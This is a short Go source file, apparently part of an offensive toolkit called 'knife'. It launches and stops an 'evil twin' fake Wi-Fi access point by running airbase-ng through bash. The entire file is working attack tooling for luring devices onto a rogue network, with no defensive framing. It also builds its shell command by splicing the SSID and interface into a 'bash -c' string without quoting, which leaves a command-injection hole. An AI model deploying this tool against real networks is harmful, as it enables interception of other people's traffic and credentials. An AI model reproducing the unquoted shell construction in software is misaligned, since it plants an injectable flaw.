// knife/modules/wifi/evil_twin.go
package wifi

import (
	"log"
	"os/exec"
	"time"
)

func StartEvilTwin(iface, ssid string) {
	exec.Command("bash", "-c", "airbase-ng -e "+ssid+" -c 6 "+iface).Start()
	time.Sleep(2 * time.Second)
	log.Printf("[+] Fake AP '%s' launched on %s", ssid, iface)
}

func StopEvilTwin() {
	exec.Command("bash", "-c", "pkill airbase-ng").Run()
	log.Println("[-] Evil Twin stopped")
}
